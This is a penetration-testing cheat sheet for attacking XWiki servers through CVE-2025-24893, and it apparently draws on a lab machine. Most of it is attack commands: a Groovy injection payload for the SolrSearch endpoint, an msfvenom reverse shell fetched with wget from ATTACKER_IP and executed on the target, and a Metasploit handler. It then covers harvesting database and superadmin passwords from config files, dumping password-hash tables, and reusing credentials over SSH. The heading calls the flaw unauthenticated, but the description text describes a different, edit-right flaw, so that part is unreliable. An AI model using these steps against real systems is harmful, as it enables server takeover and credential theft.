# XWiki

XWiki is a collaborative wiki platform written in Java.

---

## Discovery

```bash
# XWiki default ports
# 8080 - Jetty (common)
# 80/443 - behind reverse proxy

# Nmap fingerprint
nmap -sC -sV TARGET -p 8080
# http-title: XWiki - Main - Intro
# http-server-header: Jetty(10.0.20)

# robots.txt entries
/xwiki/bin/viewattachrev/
/xwiki/bin/viewrev/
/xwiki/bin/edit/
/xwiki/bin/save/
/xwiki/bin/delete/
```

---

## CVE-2025-24893 - Unauthenticated RCE via Groovy Injection

Any user with edit right on a page can execute code (Groovy, Python, Velocity) with programming right by defining a wiki macro. This allows full access to the whole XWiki installation.

**Affected Versions:** < 15.10.11, < 16.4.1, < 16.5.0RC1

**Reference:** https://github.com/advisories/GHSA-9875-cw22-f7cx

### Detection

```bash
# Check if vulnerable by visiting the SolrSearch endpoint
# If it downloads a file, the endpoint exists
curl -o /dev/null -s -w "%{http_code}" "http://TARGET:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text="
```

### Exploitation

**POC:** https://github.com/gunzf0x/CVE-2025-24893

```bash
# Clone exploit
git clone https://github.com/gunzf0x/CVE-2025-24893.git
cd CVE-2025-24893

# Usage
python3 CVE-2025-24893.py --help
# -t, --target TARGET   Target url (e.g., 'http://example.com:8080')
# -c, --command COMMAND System command to execute

# Test with ping (verify with tcpdump)
sudo tcpdump -i tun0 icmp
python3 CVE-2025-24893.py -t http://TARGET:8080 -c 'ping -c4 ATTACKER_IP'
```

### Payload Structure

The exploit injects Groovy code via the SolrSearch endpoint:

```
# URL decoded payload structure
/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}{{async async=false}}{{groovy}}"COMMAND".execute(){{/groovy}}{{/async}}
```

### Reverse Shell

Standard reverse shells may not work directly. Use staged payload:

```bash
# 1. Generate ELF payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o shell.elf

# 2. Start HTTP server
python3 -m http.server 8000

# 3. Start Metasploit handler
msfconsole -q
use multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 9001
run -j

# 4. Download payload to target
python3 CVE-2025-24893.py -t http://TARGET:8080 -c 'wget -O /tmp/shell.elf http://ATTACKER_IP:8000/shell.elf'

# 5. Make executable
python3 CVE-2025-24893.py -t http://TARGET:8080 -c 'chmod +x /tmp/shell.elf'

# 6. Execute
python3 CVE-2025-24893.py -t http://TARGET:8080 -c '/tmp/shell.elf'
```

---

## Post-Exploitation

### Configuration Files

```bash
# Main config directory
ls -la /etc/xwiki/

# Important files
/etc/xwiki/xwiki.cfg           # Main config (superadmin password)
/etc/xwiki/xwiki.properties    # Properties config
/etc/xwiki/hibernate.cfg.xml   # Database credentials!

# Data directory
/var/lib/xwiki/data
```

### Extracting Database Credentials

```bash
# Search for passwords in /etc/xwiki
cd /etc/xwiki
grep -r -i password

# hibernate.cfg.xml contains DB creds
cat hibernate.cfg.xml | grep -A1 "connection.username"
# <property name="hibernate.connection.username">xwiki</property>
# <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

### Database Access

XWiki typically uses MySQL/MariaDB:

```bash
mysql -u xwiki -h 127.0.0.1 -p'PASSWORD'

# Show databases
show databases;

# XWiki tables
use xwiki;
show tables;

# Key tables:
# xwikidoc - page data
# xwikistrings - string properties (including password hashes)
```

### Password Storage

- XWiki uses salted SHA-512 hashing by default
- Password hashes stored in `xwikistrings` table
- User data distributed across `xwikidoc` and related tables

### Credential Reuse

Database passwords often reused for system accounts:

```bash
# Try SSH with found credentials
ssh oliver@TARGET
# Password: theEd1t0rTeam99
```

---

## XWiki Paths Reference

| Path | Description |
|------|-------------|
| `/xwiki/bin/view/Main/` | Main wiki page |
| `/xwiki/bin/edit/` | Edit pages (requires auth) |
| `/xwiki/bin/get/Main/SolrSearch` | Solr search endpoint (CVE target) |
| `/etc/xwiki/` | Config directory |
| `/var/lib/xwiki/data` | Data directory |
| `/var/log/xwiki` | Log directory |
